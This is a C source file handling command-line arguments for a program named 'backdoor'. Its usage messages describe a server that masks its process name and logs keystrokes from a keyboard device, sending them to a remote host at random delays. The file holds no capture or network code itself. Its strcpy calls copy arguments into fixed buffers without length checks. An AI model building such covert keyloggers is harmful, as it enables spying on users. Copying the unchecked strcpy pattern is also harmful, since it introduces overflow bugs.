/*==============================================================================
|   SOURCE:     cmd_args.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Contains functions that relate to validating and extracting
|               program command line arguments.
==============================================================================*/
#include "../include/cmd_args.h"
#include "../include/utils.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   int validate_initial_args(int argc)
|                   argc - number of command line arguments
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks if user specified client or server argument.
------------------------------------------------------------------------------*/
int validate_initial_args(int argc)
{
    if(argc < 2)
    {
        printf("\nError: invalid arguments\n\n");
        print_usage();
        return -1;
    }

    return 0;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   int check_for_program_specifier(char **argv)
|                   argv - array of command line arguments
|
|   RETURN:     0 for client, 1 for server, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks if user wants to run client or server program.
------------------------------------------------------------------------------*/
int check_for_program_specifier(char **argv)
{
    if(strcmp(argv[ARG_PROG], "client") == 0)
    {
        return 0;
    }
    else if(strcmp(argv[ARG_PROG], "server") == 0)
    {
        return 1;
    }
    else
    {
        printf("\nError: must specify 'client' or 'server'\n\n");
        return -1;
    }
}

/*------------------------------------------------------------------------------
|   FUNCTION:   int valid_clt_args(int argc)
|                   argc - number of command line arguments
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks for correct number of client command line arguments.
------------------------------------------------------------------------------*/
int valid_clt_args(int argc)
{
    if(argc != ARG_CLT_TOTAL)
    {
        printf("\nError: invalid client arguments\n\n");
        print_clt_usage();
        return 0;
    }
    return 1;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   int valid_srv_args(int argc)
|                   argc - number of command line arguments
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks for correct number of server command line arguments.
------------------------------------------------------------------------------*/
int valid_srv_args(int argc)
{
    if(argc != ARG_SRV_TOTAL)
    {
        printf("\nError: invalid client arguments\n\n");
        print_srv_usage();
        return 0;
    }
    return 1;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void print_clt_usage()
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Prints client program usage message.
------------------------------------------------------------------------------*/
void print_clt_usage()
{
    printf("Usage: ./backdoor client [MY_IP] [HOST_IP] [MIN] [MAX]\n\n");
    printf("MY_IP     : IP of local machine running program.\n");
    printf("HOST_IP   : IP of host machine to communicate to.\n");
    printf("MIN       : Minimum sending delay in seconds.\n");
    printf("MAX       : Maximum sending delay in seconds.\n\n");
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void print_srv_usage()
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Prints server program usage message.
------------------------------------------------------------------------------*/
void print_srv_usage()
{
    printf("Usage: ./backdoor server [MY_IP] [HOST_IP] [MIN] [MAX] [MASK] [DEVICE]\n\n");
    printf("MY_IP     : IP of local machine running program.\n");
    printf("HOST_IP   : IP of host machine to communicate to.\n");
    printf("MIN       : Minimum sending delay in seconds.\n");
    printf("MAX       : Maximum sending delay in seconds.\n");
    printf("MASK      : Name to mask the running process with.\n");
    printf("DEVICE    : Path to keyboard device to log key strokes from.\n\n");
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void print_usage()
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Prints general program usage message.
------------------------------------------------------------------------------*/
void print_usage()
{
    printf("Usage: ./backdoor [PROGRAM] [MY_IP] [HOST_IP] [MIN] [MAX] [MASK] [DEVICE]\n\n");
    printf("PROGRAM   : Specify 'client' or 'server' program.\n");
    printf("MY_IP     : IP of local machine running program.\n");
    printf("HOST_IP   : IP of host machine to communicate to.\n");
    printf("MIN       : Minimum sending delay in seconds.\n");
    printf("MAX       : Maximum sending delay in seconds.\n");
    printf("MASK      : Name to mask the running process with (not needed when running client).\n");
    printf("DEVICE    : Path to keyboard device to log key strokes from (not needed when running server).\n\n");
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void extract_clt_args(char **argv, Client_Args *clt_args)
|                   **argv - array  of command line arguments
|                   *clt_args - struct to copy arguments to
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Copies client program command line arguments into a struct.
------------------------------------------------------------------------------*/
void extract_clt_args(char **argv, Client_Args *clt_args)
{
    strcpy(clt_args->my_ip, argv[ARG_MY_IP]);
    strcpy(clt_args->host_ip, argv[ARG_HOST_IP]);
    clt_args->min_delay = atoi(argv[ARG_MIN_DELAY]);
    clt_args->max_delay = atoi(argv[ARG_MAX_DELAY]);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void extract_srv_args(char **argv, Client_Args *srv_args)
|                   **argv - array  of command line arguments
|                   *srv_args - struct to copy arguments to
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Copies server program command line arguments into a struct.
------------------------------------------------------------------------------*/
void extract_srv_args(char **argv, Server_Args *srv_args)
{
    strcpy(srv_args->my_ip, argv[ARG_MY_IP]);
    strcpy(srv_args->host_ip, argv[ARG_HOST_IP]);
    strcpy(srv_args->mask, argv[ARG_MASK]);
    strcpy(srv_args->device, argv[ARG_DEVICE]);
    srv_args->min_delay = atoi(argv[ARG_MIN_DELAY]);
    srv_args->max_delay = atoi(argv[ARG_MAX_DELAY]);
}
